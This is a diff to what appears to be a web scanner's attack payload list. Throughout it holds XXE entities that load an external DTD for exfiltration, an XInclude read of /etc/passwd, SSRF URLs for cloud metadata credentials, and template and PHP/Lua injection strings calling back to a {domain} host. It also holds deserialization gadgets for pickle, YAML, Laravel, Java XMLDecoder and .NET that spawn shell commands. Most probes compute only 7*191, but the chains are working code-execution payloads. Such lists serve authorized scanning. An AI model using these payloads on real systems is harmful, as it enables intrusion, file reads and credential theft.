@@ -15,7 +15,6 @@ javascript:alert(1337)//";alert(1337)//';alert(1337)//`alert(1337)`//--></script
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{domain}/xxe">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://{domain}/evil.dtd">%dtd;%payload;]><foo>&exfil;</foo>
 <xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>
-<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY a "1337">]><foo>&a;</foo>
 ##POLYGLOT - SSRF##
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
 http://metadata.google.internal/computeMetadata/v1/
@@ -158,13 +157,11 @@ test\0admin
 {7*191}
 {math equation="7*191"}
 {math equation="7 * 191"}
-##Blade (PHP/Laravel) - Math##
-{!!7*191!!}
 ##Slim (Ruby) - Math##
 = 7 * 191
 ##Thymeleaf (Java) - Math##
 [[${7*191}]]
-[[${T(java.lang.Math).abs(-1337)}]]
+[[${T(java.lang.Math).multiplyExact(7,191)}]]
 *{7*191}
 ##Pebble (Java) - Math##
 {{"".class.forName("java.lang.Math").getMethod("abs",long.class).invoke(null,-1337)}}
@@ -172,8 +169,8 @@ test\0admin
 @(7*191)
 @(System.Math.Abs(-1337))
 ##Go text/template - Math##
-{{printf "%d" 1337}}
-{{html 1337}}
+{{multiply 7 191}}
+{{add 1336 1}}
 ##Lua Code Injection##
 loadstring("return 7*191")()
 assert(loadstring('return 7*191'))()
@@ -184,8 +181,7 @@ require('socket').sleep(5)
 require("socket").connect("{domain}", 80)
 require("socket.http").request("http://{domain}/lua")
 ##PHP Code Injection##
-assert(system('echo 1337'))
-preg_replace('/.*/e','system("echo 1337")','')
+system('expr 7 \\* 191')
 create_function('','return 7*191;')()
 assert(sleep(5)||1)
 assert(file_get_contents('http://{domain}/php'))
@@ -422,14 +418,20 @@ admin'//
 ') OR 1=1 RETURN u.password AS x //
 ##Python Pickle P0 - Math (eval 7*191)##
 Y19fYnVpbHRpbl9fCmV2YWwKKFMnNyoxOTEnCnRSLg==
+##Python Pickle P0 - Math (eval str(7*191))##
+Y19fYnVpbHRpbl9fCmV2YWwKKFMnc3RyKDcqMTkxKScKdFIu
 ##Python Pickle P2 - Math (eval 7*191)##
 gAJjX19idWlsdGluX18KZXZhbApxAFgFAAAANyoxOTFxAYVxAlJxAy4=
 ##Python Pickle P4 - Math (eval 7*191)##
 gASVIQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwFNyoxOTGUhZRSlC4=
 ##Python YAML - Math (eval 7*191)##
 !!python/object/apply:builtins.eval ["7*191"]
+##Python YAML - Math (eval str(7*191))##
+!!python/object/apply:builtins.eval ["str(7*191)"]
 ##Python jsonpickle - Math (eval 7*191)##
 {"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["7*191"]}]}
+##Python jsonpickle - Math (eval str(7*191))##
+{"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["str(7*191)"]}]}
 ##PHP Unserialize - Laravel PendingBroadcast##
 O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"\0*\0events";O:28:"Illuminate\Events\Dispatcher":1:{s:12:"\0*\0listeners";a:1:{s:8:"shutdown";a:1:{i:0;s:6:"system";}}}s:8:"\0*\0event";s:21:"nslookup {domain}";}
 ##PHP Unserialize - Symfony CacheAdapter##
@@ -438,3 +440,7 @@ O:44:"Symfony\Component\Cache\Adapter\ProxyAdapter":2:{s:54:"\0Symfony\Component
 {"rce":"_$$ND_FUNC$$_function(){return 7*191}()"}
 ##Node node-serialize - Math (eval 7*191)##
 {"rce":"_$$ND_FUNC$$_function(){return eval('7*191')}()"}
+##XMLDecoder - Math (expr 7*191)##
+<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/sh</string></void><void index="1"><string>-c</string></void><void index="2"><string>expr 7 \* 191</string></void></array><void method="start"/></object></java>
+##.NET Json.NET - Math (set /a 7*191)##
+{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c set /a 7*191"}}}
